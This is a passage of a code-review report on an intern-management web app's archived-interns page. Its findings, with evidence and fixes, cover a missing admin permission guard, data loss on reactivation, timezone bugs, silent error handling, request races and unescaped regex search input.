backend/routes/inactiveInternRoutes.js:8 `router.use(authMiddleware);` — the only guard. Compare backend/services/authService.js:121 `{ id: intern._id, email: intern.Trainee_Email, role: "intern", accountType: "intern" }, dotenv.jwtSecret`. backend/middleware/adminAuth.js:6 `if (req.user?.accountType !== "admin")` exists but is never applied to this router.
```

**Fix:** Add `const { requireAdmin, requirePermission } = require('../middleware/adminAuth');` and `router.use(authMiddleware, requireAdmin);` plus `requirePermission('interns.view')` on the GETs and `requirePermission('interns.manage')` on POST /:internId/reactivate. Also gate the Reactivate button with `hasAdminPermission('interns.manage')` in AdminInactiveInterns.jsx.

## [CRITICAL] Reactivate hard-deletes an existing active Intern that shares the same Trainee_ID (silent data loss)
`backend/repositories/internRepository.js:426` · *data-integrity*

**What's wrong:** `restoreInactiveIntern` — the function behind the page's Reactivate button (inactiveInternController.js:313) — runs `Intern.deleteMany({ Trainee_ID: doc.Trainee_ID, _id: { $ne: doc._id } })` before replacing the Intern document. This unconditionally destroys any *currently active* Intern document that has the same Trainee_ID but a different _id. The SLT sync creates exactly such documents: internService.syncWithSLTAPI (backend/services/internService.js:238-241) looks the trainee up by Trainee_ID and, if not found, adds a brand-new Intern via InternRepository.addIntern (internRepository.js:42 `new Intern(...)` -> new _id). Nothing warns the admin, and no confirm dialog mentions deletion. Related DailyRecord documents reference the deleted _id (DailyRecord.js:5-9) and are never migrated, so they become orphans while the restored snapshot shows the old (empty) history.

**Failure:** Intern 'TR1234' finishes, disappears from the SLT API, and the nightly cleanup archives them. Two months later HR re-enrols TR1234; the sync inserts a fresh Intern doc (new _id) and the intern submits 30 new logbook entries and attendance. An admin then opens Past Interns, finds the old TR1234 card, and clicks Reactivate. `deleteMany` wipes the *new active* record — 30 DailyRecords are now orphaned, all new attendance, agreementAccepted, and logbookRestriction state are gone — and the stale archived snapshot is written in its place. The intern can no longer see any of their recent work and the deletion is unrecoverable.

**Evidence:**
```
backend/repositories/internRepository.js:425-429:
```
// Delete any shell doc with same Trainee_ID but different _id
await Intern.deleteMany({
  Trainee_ID: doc.Trainee_ID,
  _id: { $ne: doc._id },
});
```
Called from backend/controllers/inactiveInternController.js:313 `await InternRepository.restoreInactiveIntern(internId);` which is the handler for POST /:internId/reactivate hit by AdminInactiveInterns.jsx:691.
```

**Fix:** Do not deleteMany. Detect the conflict first (`const clash = await Intern.findOne({ Trainee_ID: doc.Trainee_ID, _id: { $ne: doc._id } })`) and return HTTP 409 with a message like 'An active intern already exists for this Trainee ID'. Let the controller surface it, and have the page render the error.

## [HIGH] Attendance calendar highlights every Colombo-midnight attendance record one day early
`backend/controllers/inactiveInternController.js:108` · *date-timezone*

**What's wrong:** The controller builds the calendar keys with `new Date(r.date).toISOString().slice(0, 10)` (lines 108 and 119) — a UTC day key. The frontend builds its cell keys from the LOCAL calendar: AdminInactiveInterns.jsx:113-116 `keyFor = (day) => `${viewYear}-${String(viewMonth+1).padStart(2,'0')}-${String(day).padStart(2,'0')}``. Attendance rows are written as midnight *Asia/Colombo* (backend/controllers/manualAttendanceController.js:90-93 `moment.tz(date, 'YYYY-MM-DD', TZ).startOf('day').toDate()`), which is 18:30 UTC on the *previous* day. So the UTC key is one day behind the real Colombo day. The repo already ships the correct helper `getColomboDateKey` (backend/utils/attendanceHistory.js:11) and this controller does not use it. Note the bug is inconsistent, which makes it worse: logbook-derived entries written as `new Date(dateStr)` (dailyRecordController.js:51, UTC midnight) land on the right cell, so the same intern's calendar mixes correct and off-by-one days.

**Failure:** An admin manually marks Present for intern X on 2026-06-25 via Manual Attendance. Mongo stores `date: 2026-06-24T18:30:00.000Z`. After X is archived, the admin opens Past Interns -> X -> Attendance. The green cell appears on **Wednesday 24 June** instead of Thursday 25 June, and 25 June looks like an absence. Every QR/face/manual entry stored at Colombo midnight shifts the same way, so the whole month reads one day off.

**Evidence:**
```
backend/controllers/inactiveInternController.js:108 `const key = new Date(r.date).toISOString().slice(0, 10);` (and identically at :119). Real stored shape confirmed by backend/tests/attendanceHistory.test.js:24 `date: "2026-06-24T18:30:00.000Z"` for a 2026-06-25 Colombo attendance. Frontend cell key: frontend/src/pages/AdminInactiveInterns.jsx:115.
```

**Fix:** Replace both `new Date(r.date).toISOString().slice(0,10)` calls with `getColomboDateKey(r.date)` from backend/utils/attendanceHistory.js so the map keys are Asia/Colombo days, matching the frontend's local cell keys.

## [HIGH] Reactivate failures are completely silent — button spins, stops, and nothing happens
`frontend/src/pages/AdminInactiveInterns.jsx:697` · *error-handling*

**What's wrong:** `handleReactivate` wraps the whole success path in `if (res.ok) { ... }` with no `else` branch, and the `catch` only calls `console.error`. There is no error state, no toast, and no 401 handling. Any non-2xx response (expired 24h admin token -> 401, missing permission once the backend is fixed -> 403, `restoreInactiveIntern` throwing on a duplicate-key / geo-index error -> 500) produces zero user-visible feedback: `setReactivating(false)` runs in `finally`, the spinner stops, the card stays in the list, and the admin has no idea whether anything happened.

**Failure:** An admin leaves the tab open past the 24h token expiry (authService.js:20), then clicks Reactivate on 'Nimal Perera' and confirms the window.confirm. The POST returns 401 with `{code:'TOKEN_EXPIRED'}`. The button shows 'Reactivating…' for ~200ms, returns to 'Reactivate', no success banner appears, the card is still there. The admin clicks again and again, each time producing nothing, and concludes the reactivate feature is broken.

**Evidence:**
```
frontend/src/pages/AdminInactiveInterns.jsx:697-713:
```
      if (res.ok) {
        setSuccessMessage(...);
        ...
      }
    } catch (err) {
      console.error("Error reactivating intern:", err);
    } finally {
      setReactivating(false);
    }
```
No `else`, no error state, no 401 redirect.
```

**Fix:** Add an `errorMessage` state; in the else branch parse the body and `setErrorMessage(body.error || 'Failed to reactivate')`; render it next to the success banner. On `res.status === 401`, clear localStorage 'adminInfo' and `navigate('/admin-login')`.

## [HIGH] deriveArchiveReason shows swapped labels, and leaks the raw enum 'not_in_api' for the most common case
`frontend/src/pages/AdminInactiveInterns.jsx:57` · *logic-error*

**What's wrong:** `deriveArchiveReason(archiveReason, archivedAt, trainingEndDate)` returns 'Inactive' when archivedAt is the same day as trainingEndDate, and 'Past Interns' when archivedAt is *before* trainingEndDate — the labels are inverted relative to their meaning (someone archived before their end date left early = inactive; someone archived on/after their end date completed = past intern). Worse, the normal completion case `archived > end` matches neither branch and falls through to `archiveReason || 'N/A'`, which is the raw Mongo enum value. InactiveIntern.js:55-59 defines `archiveReason` enum as `['not_in_api','manual_cleanup','manual']` with default `'not_in_api'`, and the cleanup job always passes 'not_in_api' (sltApiScheduler.js:515). There is no display mapping anywhere in the file.

**Failure:** Intern with Training_EndDate 2025-06-30 is archived by the nightly job on 2025-07-05 (the normal path). Admin opens the intern -> Overview -> 'Archive Reason' shows the literal database string **not_in_api**. A second intern who quit early — end date 2025-06-30, archived 2025-06-15 — shows **'Past Interns'**, which is the opposite of the truth, while an intern archived exactly on their end date shows **'Inactive'**.

**Evidence:**
```
frontend/src/pages/AdminInactiveInterns.jsx:57-65:
```
const deriveArchiveReason = (archiveReason, archivedAt, trainingEndDate) => {
  if (archivedAt && trainingEndDate) {
    const archived = new Date(archivedAt);
    const end = new Date(trainingEndDate);
    if (isSameDay(archived, end)) return "Inactive";
    if (archived < end) return "Past Interns";
  }
  return archiveReason || "N/A";
};
```
Rendered at line 1016. Backend enum: backend/models/InactiveIntern.js:55-59.
```

**Fix:** Swap the two branches (archived < end -> 'Left early / Inactive'; same day or after -> 'Completed / Past Intern') and add a display map for the raw enum, e.g. `{ not_in_api: 'Removed from SLT API', manual_cleanup: 'Manual cleanup', manual: 'Manually archived' }[archiveReason] ?? 'N/A'`.

## [HIGH] List fetch swallows every non-OK response — expired session renders 'No inactive interns found' instead of an error or re-login
`frontend/src/pages/AdminInactiveInterns.jsx:615` · *error-handling*

**What's wrong:** `fetchInactiveInterns` only updates state inside `if (res.ok)`. There is no `else`, no error state for the list, and no 401 handling anywhere on the page (the only auth check is the mount-time `if (!token) navigate('/admin-login')` at line 562, which does not fire when a token is *present but expired*). A 401/403/500 therefore leaves `inactiveInterns` at its previous value and `loading` false, so the UI falls into the empty branch at line 811 and displays 'No inactive interns found' (or, if a list was already loaded, silently keeps showing stale rows).

**Failure:** Admin logs in at 9am; the token expires 24h later while the tab is still open. They refresh /admin/inactive-interns. GET /api/inactive-interns returns 401 `{code:'TOKEN_EXPIRED'}`. The page renders the badge '0 interns' and the message 'No inactive interns found'. The admin reports that all archived interns were deleted, when in fact they simply need to log in again.

**Evidence:**
```
frontend/src/pages/AdminInactiveInterns.jsx:612-624:
```
      const res = await fetch(`${API_BASE_URL}/inactive-interns?${params}`, { headers: authHeaders });
      if (res.ok) {
        const result = await res.json();
        setInactiveInterns(result.data || []);
        setTotalInterns(result.total || 0);
      }
    } catch (err) {
      console.error("Error fetching inactive interns:", err);
    } finally { setLoading(false); }
```
The same pattern repeats at line 644 (details fetch).
```

**Fix:** Add `else { if (res.status === 401) { localStorage.removeItem('adminInfo'); navigate('/admin-login'); return; } setListError('Failed to load inactive interns'); }` and render `listError` in place of the empty-state message.

## [HIGH] Page and route render the Reactivate action with no permission check while the backend enforces none — admins without interns.manage can bypass the nav gate
`frontend/src/pages/AdminInactiveInterns.jsx:923` · *permissions-auth*

**What's wrong:** AdminNavigation.jsx:56 gates the "Inactive Interns" link on `permission: "interns.manage"`, but the route at AppRoutes.jsx:188-191 sits inside the plain <AdminRoute> group, and AdminRoute.jsx:7 only verifies `session?.token && session?.user?.role` — no per-permission check. The page itself never calls hasAdminPermission (frontend/src/utils/adminAuth.js:6-9) and renders the Reactivate button unconditionally. Because the backend route has no permission middleware either (see finding 1), there is no enforcement anywhere in the stack.

**Failure:** An admin whose role only grants, say, `announcements.manage` does not see the Inactive Interns link in the sidebar. They type /admin/inactive-interns in the address bar (or a colleague shares the URL). The page loads completely, lists every archived intern with their email and home address, and the green Reactivate button works — restoring an intern into the live system, an action their role was explicitly not granted. No 403 is ever returned.

**Evidence:**
```
Nav gate: frontend/src/components/AdminNavigation.jsx:56 `{ to: "/admin/inactive-interns", label: "Inactive Interns", ..., permission: "interns.manage" }`
Route with no permission wrapper: frontend/src/routes/AppRoutes.jsx:188-191
Guard only checks token+role: frontend/src/components/AdminRoute.jsx:7 `if (!session?.token || !session?.user?.role)`
Button rendered unconditionally: frontend/src/pages/AdminInactiveInterns.jsx:923-928 `<motion.button onClick={handleReactivate} disabled={reactivating} ...>` — hasAdminPermission is never imported in this file.
```

**Fix:** Import hasAdminPermission and early-return a 403 view when `!hasAdminPermission('interns.manage')`, hide/disable the Reactivate button on the same check, and (authoritatively) add requirePermission('interns.manage') to inactiveInternRoutes.js.

## [MEDIUM] Reactivate updates the list optimistically and never refetches, leaving a short page and a possibly empty page
`frontend/src/pages/AdminInactiveInterns.jsx:701` · *logic-error*

**What's wrong:** After a successful reactivate the handler mutates local state only: `setTotalInterns(prev => Math.max(0, prev - 1))` and `setInactiveInterns(prev => prev.filter(...))`. It never calls `fetchInactiveInterns()`, so the current page is not refilled from the server. Because the list is server-paginated (PAGE_SIZE 15, skip/limit computed in inactiveInternController.js:45), the page now holds 14 items while item #16 (which should have shifted up) is never fetched. If the admin is on the last page and it held a single item, the page becomes empty even though earlier pages have data, and `totalPages` shrinks below `currentPage` with no clamping (line 585 computes totalPages but currentPage is never clamped).

**Failure:** 31 archived interns, PAGE_SIZE 15 -> 3 pages. Admin goes to page 3 (1 card), reactivates that intern. totalInterns becomes 30 -> totalPages becomes 2, but currentPage stays 3. The strip now shows 'No inactive interns found' and the Pagination bar highlights page 3 which no longer exists. On page 1 the same action leaves 14 cards; the 15th archived intern is invisible until a manual refresh.

**Evidence:**
```
frontend/src/pages/AdminInactiveInterns.jsx:701-706:
```
        setTotalInterns((prev) => Math.max(0, prev - 1));
        setInactiveInterns((prev) => prev.filter((i) => i.id !== selectedIntern.id));
        setSelectedIntern(null);
        setDetails(null);
```
No `fetchInactiveInterns()` call; `totalPages` at line 585 is derived but `currentPage` is never clamped to it.
```

**Fix:** Replace the optimistic splice with `await fetchInactiveInterns()` after success, and add `useEffect(() => { if (totalPages > 0 && currentPage > totalPages) setCurrentPage(totalPages); }, [totalPages, currentPage]);`.

## [MEDIUM] Race condition: clicking two interns quickly can show intern A's details under intern B's name
`frontend/src/pages/AdminInactiveInterns.jsx:632` · *race-condition*

**What's wrong:** `handleSelectIntern` fires a fetch with no AbortController and no staleness guard. It sets `selectedIntern` immediately, then unconditionally does `setDetails(result.data)` when the response arrives. Two overlapping clicks resolve in arrival order, not click order, so a slower earlier request overwrites the newer one. `setDetailsLoading(false)` in the `finally` block is likewise driven by whichever request finishes last, so the panel can also flash out of its loading state while the intended request is still in flight. The same pattern exists in `fetchDailyRecords` (line 656) and `fetchInactiveInterns` (line 604) — page/search changes are not cancelled either.

**Failure:** Admin clicks card 'Nimal Perera' (response takes 900ms because his attendance array is large), then immediately clicks 'Sunil Silva' (responds in 120ms). Silva's details render, then 800ms later Perera's response lands and overwrites `details`. The header (driven by `details.traineeName`) now says Nimal Perera while the highlighted card is Sunil Silva; clicking Reactivate uses `selectedIntern` (Silva) even though the admin is reading Perera's data — the wrong intern is reactivated.

**Evidence:**
```
frontend/src/pages/AdminInactiveInterns.jsx:639-652:
```
    setDetailsLoading(true);
    try {
      const res = await fetch(`${API_BASE_URL}/inactive-interns/${intern.id}`, { headers: authHeaders });
      if (res.ok) {
        const result = await res.json();
        setDetails(result.data);   // <- no check that `intern` is still the selected one
      }
    } ... finally { setDetailsLoading(false); }
```
```

**Fix:** Keep a `latestRequestId` ref (or an AbortController per selection): `const reqId = ++selectionRef.current; ... if (selectionRef.current !== reqId) return; setDetails(result.data);` and abort the previous controller at the top of the handler. Apply the same guard to fetchInactiveInterns and fetchDailyRecords.

## [MEDIUM] Search terms containing regex metacharacters return a 500 and the UI silently keeps the previous results
`backend/repositories/internRepository.js:371` · *api-contract*

**What's wrong:** `getAllInactiveInternsPaginated` injects the raw user search string straight into `$regex` for three fields, with no escaping. MongoDB rejects an invalid regular expression and the query throws, so `getAllInactiveInterns` falls into its catch and returns HTTP 500 (inactiveInternController.js:78). The page's fetch only handles `res.ok` (AdminInactiveInterns.jsx:615), so state is untouched: the previously rendered cards and the '<n> interns found' badge stay on screen unchanged, giving the admin no signal that the search failed. (It is also an unbounded-regex/ReDoS surface on an endpoint currently reachable by any authenticated user.)

**Failure:** Admin types the search 'Perera (IT' into the box. After the 300ms debounce the request GET /api/inactive-interns?page=1&limit=15&search=Perera%20(IT is sent. Mongo throws 'Regular expression is invalid: missing )' -> 500. The strip still shows the 15 cards from the previous unfiltered query and the badge still reads e.g. '31 interns found', so the admin believes those 15 people match 'Perera (IT'.

**Evidence:**
```
backend/repositories/internRepository.js:368-376:
```
    const filter = search
      ? { $or: [
            { Trainee_Name: { $regex: search, $options: "i" } },
            { Trainee_ID:   { $regex: search, $options: "i" } },
            { Trainee_Email:{ $regex: search, $options: "i" } },
          ] }
      : {};
```
Frontend sends it verbatim at frontend/src/pages/AdminInactiveInterns.jsx:611 `params.append("search", searchTerm)`.
```

**Fix:** Escape the input before building the regex: `const safe = search.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&');` and use `{ $regex: safe, $options: 'i' }`. Additionally give the page an error branch so a 500 is visible.

## [MEDIUM] Both calendars always open on the current month, so a past intern's attendance and logbook look empty
`frontend/src/pages/AdminInactiveInterns.jsx:86` · *logic-error*

**What's wrong:** `AttendanceCalendar` initialises `viewYear`/`viewMonth` to `today.getFullYear()` / `today.getMonth()` (lines 86-87), and `DailyRecordsCalendar` does the same (lines 237-238). This page exists solely to inspect interns whose training already ended — their attendance and DailyRecord data are entirely in past months. Neither component derives its initial month from the data it was handed (`dailyMap`/`meetingMap`/`recordsByDate` keys) or from `details.trainingEndDate`, so the first thing the admin sees is always an all-blank grid for the current month.

**Failure:** Admin opens an intern archived in September 2025 and clicks Attendance in August 2026. The stat cards correctly read 'Daily Attendance 96 / 96 present', but the grid below shows August 2026 with zero coloured cells. The Daily Records tab reads '112 entries' next to a calendar where no date is clickable. The admin has to press the back-chevron 11 times to reach any data, and typically concludes the calendar is broken.

**Evidence:**
```
frontend/src/pages/AdminInactiveInterns.jsx:85-87:
```
  const today = new Date();
  const [viewYear, setViewYear] = useState(today.getFullYear());
  const [viewMonth, setViewMonth] = useState(today.getMonth()); // 0-indexed
```
and identically at lines 236-238 in DailyRecordsCalendar. Neither reads `dailyMap`/`recordsByDate` keys for an initial month.
```

**Fix:** Seed the initial month from the newest data key, e.g. `const seed = Object.keys({...dailyMap, ...meetingMap}).sort().pop(); const init = seed ? new Date(seed + 'T00:00:00') : new Date();` then `useState(init.getFullYear())` / `useState(init.getMonth())`, and do the same with `recordsByDate` in DailyRecordsCalendar.

## [MEDIUM] Daily Records panel renders meetingAttendance and attendanceTime, fields that no longer exist on DailyRecord
`frontend/src/pages/AdminInactiveInterns.jsx:429` · *api-contract*

**What's wrong:** `DailyRecordsCalendar` renders a 'Meeting Attendance (n)' section from `selectedRecord.meetingAttendance` (line 429-458) and a 'Marked at' line from `selectedRecord.attendanceTime` (line 460-471). Neither field is on the DailyRecord schema (backend/models/DailyRecord.js only declares internId, traineeId, date, stack, task, progress, blockers, status), and a migration explicitly `$unset` them from every existing document. The records come straight from `DailyRecord.find(query)` in inactiveInternController.js:271 with no enrichment, so these branches are permanently dead: the admin can never see meeting attendance or the check-in time for an archived intern, and there is no fallback message telling them so.

**Failure:** Admin opens an archived intern -> Daily Records -> clicks a highlighted date. The panel shows Stack / Task / Progress / Blockers correctly, but the 'Meeting Attendance' block and the 'Marked at HH:MM' line never render for any record on any intern, because `selectedRecord.meetingAttendance` and `selectedRecord.attendanceTime` are always `undefined`. Since Mongoose strict mode also drops these on write (dailyRecordController.js:146 sets attendanceTime on a schema that has no such path), they will never come back.

**Evidence:**
```
backend/scripts/removeAttendanceFromDailyRecords.js:14-19:
```
          $unset: {
            meetingAttendance: "",
            attendance: "",
            attendanceTime: "",
            checkOutTime: "",
          },
```
backend/models/DailyRecord.js:3-50 declares none of these paths. Frontend usage: frontend/src/pages/AdminInactiveInterns.jsx:429 `{selectedRecord.meetingAttendance?.length > 0 && (` and :460 `{selectedRecord.attendanceTime && (`.
```

**Fix:** Either drop the two dead blocks from DailyRecordsCalendar, or have getInactiveInternDailyRecords join the intern's `attendance` sub-array by Colombo date key and attach `attendanceTime` / meeting entries to each record before responding.

## [MEDIUM] Attendance entries with the default type 'manual' are counted and coloured as Meeting attendance
`backend/controllers/inactiveInternController.js:10` · *logic-error*

**What's wrong:** `MEETING_ATTENDANCE_TYPES` includes `"manual"` (line 10), while `DAILY_ATTENDANCE_TYPES` does not. But `"manual"` is the schema *default* for `attendance.type` (backend/models/Intern.js:20 and models/InactiveIntern.js:9), and several daily check-in write paths push attendance entries without a `type` at all, so they land as 'manual': backend/services/qrCodeService.js:60 `intern.attendance.push({ date: today, status })`, and internRepository.js:95, :114 and :316. Every such daily check-in is therefore attributed to the blue 'Meeting Attendance' card and painted blue on the calendar instead of the green 'Daily Attendance' card.

**Failure:** An archived intern has 60 legacy QR daily check-ins written via qrCodeService.markAttendance (no `type`, defaulted to 'manual') and 4 real meeting attendances. On the Attendance tab, the green 'Daily Attendance' card shows **0** and the blue 'Meeting Attendance' card shows **64**. The calendar paints 60 working days blue, so the admin concludes the intern never physically attended and only sat in meetings.

**Evidence:**
```
backend/controllers/inactiveInternController.js:5-11:
```
const MEETING_ATTENDANCE_TYPES = new Set([
  "qr", "face_meeting", "meeting", "manual_meeting", "manual",
]);
```
Write path with no type: backend/services/qrCodeService.js:60 `intern.attendance.push({ date: today, status });` against a schema whose default is `type: "manual"` (backend/models/Intern.js:20).
```

**Fix:** Stop treating the schema default as a meeting marker: remove "manual" from MEETING_ATTENDANCE_TYPES (matching backend/controllers/dailyRecordController.js:29-34 and utils/attendanceHistory.js, which never treat 'manual' as daily either) and add an explicit 'unclassified' bucket, or backfill legacy untyped entries to 'daily'.

## [MEDIUM] daily-records date-range filter compares a Date against DailyRecord.date, which is a String — returns zero rows
`backend/controllers/inactiveInternController.js:262` · *api-contract*

**What's wrong:** `getInactiveInternDailyRecords` builds `query.date.$gte = new Date(startDate)` and `query.date.$lte = end` (a Date with setHours(23,59,59,999)). But `DailyRecord.date` is declared `{ type: String, required: true }` (backend/models/DailyRecord.js:13-16) and is written as a 'YYYY-MM-DD' string (dailyRecordController.js:75 `getSriLankanDateString()`). In MongoDB, BSON type-bracketing means a Date-typed range predicate never matches String values, so the query returns an empty result set instead of the filtered range. The endpoint is the one the page calls at AdminInactiveInterns.jsx:662; the page currently omits the params, so the bug is latent from this page but fires for any caller that supplies them, and would silently break the moment a date filter is added to the UI.

**Failure:** Any caller (or a future filter control on this page) requests GET /api/inactive-interns/<id>/daily-records?startDate=2025-01-01&endDate=2025-06-30 for an intern with 120 entries in that window. Mongo evaluates `{ date: { $gte: ISODate('2025-01-01'), $lte: ISODate('2025-06-30T23:59:59.999') } }` against string values and matches nothing. The response is `{ success:true, data: [], recordsByDate: {} }` with HTTP 200, and the Daily Records tab renders '0 entries' with a completely un-clickable calendar — indistinguishable from an intern who never submitted a logbook.

**Evidence:**
```
backend/controllers/inactiveInternController.js:260-269:
```
      if (startDate || endDate) {
        query.date = {};
        if (startDate) query.date.$gte = new Date(startDate);
        if (endDate) {
          const end = new Date(endDate);
          end.setHours(23, 59, 59, 999);
          query.date.$lte = end;
        }
      }
```
vs backend/models/DailyRecord.js:13-16 `date: { type: String, required: true }`.
```

**Fix:** Compare strings, since the stored format is lexicographically sortable: `if (startDate) query.date.$gte = String(startDate).slice(0,10); if (endDate) query.date.$lte = String(endDate).slice(0,10);` (no setHours needed for date-only keys).

## [MEDIUM] Reactivate does not remove the intern from PastInternLocation, so they stay on the Past Intern map forever
`backend/repositories/internRepository.js:437` · *data-integrity*

**What's wrong:** `restoreInactiveIntern` reverses only the Intern <-> InactiveIntern move: it strips archive metadata, replaces the Intern doc and deletes the InactiveIntern doc. It does not touch the PastInternLocation collection. That collection is populated by backend/scripts/syncPastInternLocations.js, which classifies 'past' purely as 'in the SLT all-trainees API but NOT in the active Intern collection' (script lines 95-103) and only ever inserts — the script contains no delete/remove call at all. Consequently a reactivated intern is simultaneously an active Intern and a PastInternLocation row, and `getPastInternLocations` (backend/controllers/pastInternController.js:12-19) will keep returning them.

**Failure:** Intern 'TR2210' is archived and later picked up by the location sync, creating a PastInternLocation doc with their geocoded home address. An admin reactivates TR2210 from Past Interns. TR2210 is now active and appears in the active intern list and the active locations map — but they also still appear as a pin and in the district counts on the Past Intern Locations page, and re-running syncPastInternLocations.js will not clear them because the script never deletes. District headcounts are double-counted from that point on.

**Evidence:**
```
backend/repositories/internRepository.js:433-440:
```
    await Intern.collection.findOneAndReplace({ _id: doc._id }, doc, { upsert: true });
    await InactiveIntern.findByIdAndDelete(internId);
    return await Intern.findById(doc._id);
```
No PastInternLocation cleanup. backend/scripts/syncPastInternLocations.js contains no `delete`/`remove` call (grep for /delete|remove/i returns no matches), and classifies past interns at lines 95-103 by absence from the Intern collection.
```

**Fix:** In restoreInactiveIntern, after the Intern replace, add `await PastInternLocation.deleteOne({ Trainee_ID: doc.Trainee_ID });` (and have syncPastInternLocations.js prune rows whose Trainee_ID is now in the active Intern set).

## [MEDIUM] Unguarded JSON.parse of localStorage 'adminInfo' throws during render and white-screens the page
`frontend/src/pages/AdminInactiveInterns.jsx:558` · *crash*

**What's wrong:** The component body starts with `const adminInfo = JSON.parse(localStorage.getItem("adminInfo") || "{}");` — executed on every render, with no try/catch. If the stored value is not valid JSON (partial write, a stray manual edit, another tab writing a plain string, quota-truncated value), `JSON.parse` throws synchronously inside the render function. React unwinds and, with no error boundary on the admin route tree in AppRoutes.jsx, the whole app unmounts to a blank screen with only a console error. The project already ships a safe helper for exactly this — `getAdminSession()` in frontend/src/utils/adminAuth.js:2-4 wraps the parse in try/catch — and this page does not use it (AdminRoute.jsx:6 does).

**Failure:** localStorage['adminInfo'] holds a truncated value such as `{"token":"eyJhbGciOi` (browser storage-quota truncation, or a half-finished write from a concurrent tab). AdminRoute's getAdminSession() catches the error and returns null so it redirects — but if the corruption happens after mount, or on any route that reaches this component with the bad value, line 558 throws `SyntaxError: Unexpected end of JSON input` and the user gets a fully blank page with no way to recover except clearing site data.

**Evidence:**
```
frontend/src/pages/AdminInactiveInterns.jsx:558-559:
```
  const adminInfo = JSON.parse(localStorage.getItem("adminInfo") || "{}");
  const token = adminInfo.token;
```
Safe alternative already in the repo — frontend/src/utils/adminAuth.js:2-4:
```
  try { return JSON.parse(localStorage.getItem("adminInfo") || "null"); }
  catch { return null; }
```
```

**Fix:** Replace lines 558-559 with `const token = getAdminSession()?.token;` importing `getAdminSession` from ../utils/adminAuth, and memoise `authHeaders` with useMemo on [token].

## [MEDIUM] Details fetch race — a slow response for a previously-clicked intern overwrites the currently-selected intern's panel
`frontend/src/pages/AdminInactiveInterns.jsx:641` · *race-condition*

**What's wrong:** handleSelectIntern fires an unguarded fetch with no AbortController and no request-sequence/id check before calling setDetails. Nothing verifies that the response that just arrived belongs to the intern currently in selectedIntern. The card strip stays fully clickable during the load.

**Failure:** An admin clicks intern A (whose record has a large attendance array and is slow), then within a second clicks intern B (fast). B's response arrives first: the panel correctly shows B and detailsLoading goes false. A's response then arrives and calls setDetails(A.data). The blue-highlighted card in the strip is still B, but the details header now reads A's name, ID, institute, home address and archive date, and the Attendance tab shows A's calendar. If the admin clicks Reactivate at that moment, handleReactivate uses selectedIntern (B), so they reactivate B while looking at A's profile.

**Evidence:**
```
frontend/src/pages/AdminInactiveInterns.jsx:640-652:
    try {
      const res = await fetch(`${API_BASE_URL}/inactive-interns/${intern.id}`, {
        headers: authHeaders,
      });
      if (res.ok) {
        const result = await res.json();
        setDetails(result.data);   // <- no check that intern.id is still the selected one
      }
```

**Fix:** Keep a `requestIdRef` (or AbortController per selection) and guard the setter: `if (reqId === latestReqRef.current) setDetails(result.data);`, aborting the previous request in handleSelectIntern.

## [MEDIUM] List fetch race — an older page/search response can overwrite a newer one
`frontend/src/pages/AdminInactiveInterns.jsx:612` · *race-condition*

**What's wrong:** fetchInactiveInterns creates a new fetch on every currentPage/searchTerm change with no AbortController and no cleanup in the effect at lines 627-629. Responses are applied unconditionally, so ordering is whatever the network delivers. The 300 ms debounce only covers keystrokes; pagination clicks are entirely unthrottled and the Pagination page-number buttons are never disabled while a request is in flight.

**Failure:** On a slow connection the admin clicks page 2 then immediately page 3. Page 3's response returns first and renders correctly; page 2's response then lands and calls setInactiveInterns(page2 data). The strip now shows page 2's 15 interns while the Pagination widget highlights button 3 as active. Clicking Next goes to page 4, so the admin skips the real page 3 records entirely without noticing.

**Evidence:**
```
frontend/src/pages/AdminInactiveInterns.jsx:604-629 — fetchInactiveInterns has no AbortController; the consuming effect has no cleanup:
  useEffect(() => {
    fetchInactiveInterns();
  }, [fetchInactiveInterns]);
```

**Fix:** Create an AbortController inside fetchInactiveInterns, pass `signal` to fetch, and return `() => controller.abort()` from the effect (ignoring AbortError in the catch).

## [LOW] Duplicate React keys on the intern card meta rows when email and institute are both empty
`frontend/src/pages/AdminInactiveInterns.jsx:851` · *data-integrity*

**What's wrong:** Each card renders three meta rows from an inline array keyed by their own display text: `key={label}` where label is `intern.email`, `intern.institute`, or the archive-date string. `Trainee_Email` and `Institute` both default to `""` on the model (backend/models/InactiveIntern.js:39 and :41) and are passed through unchanged by the controller (inactiveInternController.js:58-59), so an archived intern missing both produces two siblings with `key=""`. React logs 'Encountered two children with the same key' and may reuse/mis-associate the two DOM nodes when the list re-renders on page change.

**Failure:** An archived intern imported from the SLT API without an email or institute renders a card whose second and third meta rows both have key="". The console fills with duplicate-key warnings on every page change, and when paginating, the envelope/school icon rows can retain the previous intern's tooltip because React reuses the mis-keyed node.

**Evidence:**
```
frontend/src/pages/AdminInactiveInterns.jsx:840-861:
```
                            {[
                              { icon: FaEnvelope, label: intern.email },
                              { icon: FaSchool, label: intern.institute },
                              { icon: FaCalendar, label: intern.archivedAt ? ... : "No archive date" },
                            ].map(({ icon: Icon, label }) => (
                              <div key={label} ...
```
Defaults that make both labels "": backend/models/InactiveIntern.js:39 `Trainee_Email: { type: String, default: "" }`, :41 `Institute: { type: String, default: "" }`.
```

**Fix:** Give each row a stable identifier instead of its value, e.g. add `id: 'email' | 'institute' | 'archived'` to each object and use `key={id}`, and render `label || '—'`.

## [LOW] Success-banner setTimeout is never cleared, firing setState after unmount
`frontend/src/pages/AdminInactiveInterns.jsx:707` · *react-state*

**What's wrong:** `handleReactivate` schedules `setTimeout(() => setSuccessMessage(""), 3000)` but stores no handle and registers no cleanup, so nothing cancels it if the component unmounts within those 3 seconds. It is also not tied to any useEffect. Rapid successive reactivations stack independent timers, each able to clear a newer banner early.

**Failure:** Admin reactivates an intern, sees the green banner, then immediately clicks 'Dashboard' in the sidebar. AdminInactiveInterns unmounts, and 3 seconds later the orphaned timer calls setSuccessMessage on the unmounted component (a leaked closure holding the whole component scope). In the stacked case: reactivate intern A at t=0, intern B at t=2.5s — A's timer fires at t=3s and clears B's banner after only 0.5s.

**Evidence:**
```
frontend/src/pages/AdminInactiveInterns.jsx:707 `setTimeout(() => setSuccessMessage(""), 3000);` — no returned id, no clearTimeout anywhere in the file.
```

**Fix:** Hold the id in a ref and clear it: `clearTimeout(bannerRef.current); bannerRef.current = setTimeout(...)`, plus `useEffect(() => () => clearTimeout(bannerRef.current), [])`.

## [LOW] Daily records silently capped at 200 while the UI reports the truncated count as the total
`backend/controllers/inactiveInternController.js:273` · *logic-error*

